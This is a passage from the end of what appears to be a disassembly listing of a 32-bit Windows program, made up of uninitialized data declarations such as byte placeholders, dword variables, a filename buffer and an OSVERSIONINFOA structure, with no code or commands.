db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
dword_40A8AC dd ?
dword_40A8B0 dd ?
dword_40A8B4 dd ?
; char Dest
Dest db ?
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
dword_40A9B8 dd ?
dword_40A9BC dd ?
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A9F8 db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
dword_40AA18 dd ?
; BYTE dword_40AA1C
dword_40AA1C dd ?
byte_40AA20 db ?
align 2
word_40AA22 dw ?
align 8
; struct _OSVERSIONINFOA VersionInformation
VersionInformation _OSVERSIONINFOA <?>
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40AAC4 db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
; CHAR Buffer
Buffer db ?
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
; CHAR Filename[256]
Filename db 100h dup(?)
dword_40ACE4 dd ?
dword_40ACE8 dd ?
dword_40ACEC dd ?
; HANDLE hObject
hObject dd ?
dword_40ACF4 dd ?
dword_40ACF8 dd ?
; CHAR Class[4]
Class db 4 dup(?)
dword_40AD00 dd ?
dword_40AD04 dd ?
dword_40AD08 dd ?
dword_40AD0C dd ?
dword_40AD10 dd ?
dword_40AD14 dd ?
dword_40AD18 dd ?
align 400h
_data ends


end start
